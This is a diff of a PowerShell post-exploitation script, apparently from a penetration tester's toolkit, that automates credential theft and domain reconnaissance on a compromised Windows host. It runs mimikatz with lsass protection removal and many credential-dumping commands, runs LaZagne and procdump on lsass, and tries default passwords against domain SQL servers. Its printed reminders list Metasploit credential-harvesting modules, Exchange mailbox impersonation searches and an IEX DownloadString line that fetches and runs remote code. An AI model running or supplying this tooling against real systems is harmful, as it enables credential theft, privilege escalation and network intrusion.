@@ -1,15 +1,33 @@
 cd C:/blood
+mkdir loot
 try {Invoke-SessionGopher -Thorough}
 catch {$_}
-./winPEASany_ofs.exe log=winpeas.txt
-./lazagne.exe all | tee lazagne.txt
+./winPEASany_ofs.exe | tee loot/winpeas.txt
+./lazagne.exe all | tee loot/lazagne.txt
 ./mimikatz*/mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
-Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/lsass.zip
+Compress-Archive -LiteralPath C:/blood/lsass.dmp -DestinationPath C:/blood/loot/lsass.zip
+echo "ENUMERATING USERS HOME:"
+tree /F /A "C:/Users" | tee loot/home_tree
+echo "ENUMERATING DOMAIN SHARES:"
+Find-DomainShare | tee loot/domain_shares.txt
+echo "ENUMERATING DOMAIN FILE SERVERS:"
+Get-DomainFileServer | tee loot/domain_fileservers.txt
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
-Write-Host -ForegroundColor Yellow "Loot with meterpreter:"
-Write-Host -ForegroundColor DarkYellow @"
+echo "ENUMERATING LOCAL SQL DB:" | tee loot/local_sqldb.txt
+Get-SQLInstanceLocal >> loot/local_sqldb.txt
+Get-SQLInstanceLocal | Get-SQLServerInfo >> loot/local_sqldb.txt
+
+echo "ENUMERATING DOMAIN SQL DB:" | tee loot/domain_sqldb.txt
+Get-SQLInstanceDomain >> loot/domain_sqldb.txt
+echo "TRYING TO LOGIN AS $env:username TO THE ABOVE DATABASES:" >> loot/domain_sqldb.txt
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft >> loot/domain_sqldb.txt
+echo "TRYING DEFAULT CREDS TO THE ABOVE DATABASES:" >> loot/domain_sqldb.txt
+Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw  >> loot/domain_sqldb.txt
+
+Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
+Write-Host -ForegroundColor Yellow "CREDS USING METERPRETER:"
+Write-Host -ForegroundColor DarkYellow @'
 migrate -N lsass.exe
 hashdump
 run post/windows/gather/credentials/credential_collector
@@ -22,14 +40,53 @@ run post/windows/gather/credentials/enum_laps
 run post/windows/wlan/wlan_profile
 run post/windows/gather/credentials/sso
 run post/windows/gather/credentials/gpp
+run post/windows/gather/enum_putty_saved_sessions
 run post/windows/gather/credentials/coreftp
 run post/multi/gather/filezilla_client_cred
 run post/windows/gather/credentials/vnc
 run post/windows/gather/credentials/winscp
 run post/windows/gather/ntds_location
 run post/windows/gather/ntds_grabber
+'@
+
+Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
+Write-Host -ForegroundColor Yellow "SEARCH MAILBOX:"
+Write-Host -ForegroundColor DarkYellow @'
+LOCAL:              Invoke-SelfSearch -OutputCsv local-results.csv -Mailbox user@example.com
+REMOTE:             Invoke-SelfSearch -Remote -ExchHostname Exch01 -OutputCsv local-results.csv -Mailbox user@example.com
+AS EXCHANGE ADMIN:  Invoke-GlobalMailSearch -ImpersonationAccount TARGET_USER -ExchHostname Exch01 -OutputCsv global-results.csv
+
+EXCHANGE ADMIN GROUPS: Exchange Organization Administrators or Organization Management
+'@
+
+Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
+Write-Host -ForegroundColor Yellow "ENUMERATE SQL DATABASES AS ANOTHER USERS:"
+Write-Host -ForegroundColor DarkYellow @"
+IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
+Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10
+Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefaultPw -Verbose
+Get-SQLServerInfo -Instance "SQL_NAME"
+Invoke-SQLEscalatePriv -Verbose -Instance "SQL_NAME"
+Invoke-SQLAudit -Verbose -Instance SQL_NAME
+Invoke-SQLEscalatePriv -Verbose -Instance "SQL_NAME"
+Invoke-SQLDumpInfo -Verbose -Instance "SQL_NAME"
+Get-SqlServerLinkCrawl -Instance "SQL_NAME" | select instance,links | ft
 "@
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
-Write-Host -ForegroundColor Yellow "Login using XFREERDP with a share:"
-Write-Host -ForegroundColor DarkYellow "xfreerdp /u:crimson /p:ASDqwe123 /w:1920 /h:1080 /dynamic-resolution /v:IP /bpp:8 /network:modem /compression -themes -wallpaper /auto-reconnect -glyph-cache /clipboard /audio-mode:1 /relax-order-checks /drive:share,/home/karmaz95/share"
+Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
+Write-Host -ForegroundColor Yellow "ENUMERATE FOREST:"
+Write-Host -ForegroundColor DarkYellow @'
+ENUM AS CURRENT USER: . ad_enumerator -domain domain.com -asme
+ENUM AS ANOTHER USER: . ad_enumerator -domain domain.com -user username -pass password
+'@
+
+Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
+Write-Host -ForegroundColor Yellow "CHECK THE LOOT:"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\winpeas.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\mimikatz.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\lazagne.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\home_tree.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_shares.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_fileservers.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\local_sqldb.txt"
+Write-Host -ForegroundColor Yellow "type C:\blood\loot\domain_sqldb.txt"
